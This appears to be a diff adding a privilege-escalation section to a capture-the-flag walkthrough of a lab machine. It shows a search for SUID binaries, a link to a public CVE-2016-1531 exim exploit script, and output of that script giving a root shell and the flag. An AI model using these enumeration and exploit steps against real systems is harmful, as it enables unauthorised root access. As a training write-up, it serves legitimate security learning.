@@ -122,6 +122,84 @@ after that just type :
 
 yes, we just escaped the restircted environment and have a normal shell
 
+## 4.Privilege Escalation
+
+I tried finding SUID binaries on the system and found :
+
+```bash
+paul@pluck:~$ find / -user root -perm /4000 2>/dev/null
+/usr/exim/bin/exim-4.84-7
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/s-nail/s-nail-privsep
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/su
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/ping
+/bin/ntfs-3g
+```
+
+in the first line we see `exim-4.84-7` that has suid permission, so i searched for its exploit online and found [this github page](https://github.com/kam1n0/sudo-exim4-privesc/blob/master/cve-2016-1531.sh)
+
+and uploaded it on the server :
+
+```bash
+paul@pluck:/tmp$ ./CVE-2016-1531.sh
+[ CVE-2016-1531 local root exploit
+# id
+uid=0(root) gid=1002(paul) groups=1002(paul)
+
+# cd /root
+
+# cat flag.txt
+
+Congratulations you found the flag
+
+---------------------------------------
+
+######   ((((((((((((((((((((((((((((((
+#########   (((((((((((((((((((((((((((
+,,##########   ((((((((((((((((((((((((
+@@,,,##########   (((((((((((((((((((((
+@@@@@,,,##########                     
+@@@@@@@@,,,############################
+@@@@@@@@@@@,,,#########################
+@@@@@@@@@,,,###########################
+@@@@@@,,,##########                    
+@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
+,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
+##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
+#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+# 
+
+```
+
+this is how you can get root on the system :)
+
+
+
+
+
+
+
+
+
+
+
 
 
 
